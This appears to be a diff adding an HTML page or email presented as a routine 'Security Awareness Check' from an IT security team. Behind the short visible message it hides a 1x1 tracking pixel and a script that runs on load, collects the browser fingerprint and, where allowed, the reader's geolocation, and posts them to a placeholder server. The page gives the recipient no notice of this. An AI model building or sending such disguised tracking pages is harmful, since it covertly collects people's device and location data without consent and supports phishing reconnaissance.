@@ -1,0 +1,56 @@
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+      body { margin:0; padding:0; background:#f5f7fa; font-family: 'Segoe UI',Arial,sans-serif; }
+      .container { background: #fff; max-width: 450px; margin: 40px auto; border-radius:12px; box-shadow: 0 2px 8px #0002; padding: 32px 24px; }
+      h1 { font-size: 1.25rem; color: #153f6a; margin-bottom: 8px;}
+      p { color: #394a59; line-height:1.5; font-size: 1rem;}
+      .footer { font-size: 0.82rem; color:#9ba6b2; margin-top:36px;}
+      @media (max-width: 600px) {
+        .container { padding:18px 6px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Security Awareness Check</h1>
+      <p>Hello,</p>
+      <p>This is a routine, internal security awareness check. <br>
+      Please take a moment to review your email security habits.</p>
+      <p>If you have any questions, contact your IT department.</p>
+      <div class="footer">Hexcode Security Team &middot; Confidential Awareness Testing</div>
+    </div>
+    <img src="https://YOUR_PUBLIC_SERVER/beacon.png" style="width:1px;height:1px;display:none;" alt="." />
+    <script>
+      (function(){
+        var data = {
+          user_agent: navigator.userAgent || "",
+          device_id: navigator.platform || "",
+          mail_client: navigator.appVersion || "",
+          language: navigator.language || "",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+          screen_size: screen.width+'x'+screen.height,
+        };
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(pos){
+              data.lat = pos.coords.latitude;
+              data.lng = pos.coords.longitude;
+              send();
+            },
+            function(){ send(); },
+            {timeout:2500}
+          );
+        } else { send(); }
+        function send(){
+          fetch('https://YOUR_PUBLIC_SERVER/collect', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify(data)
+          });
+        }
+      })();
+    </script>
+  </body>
+</html>
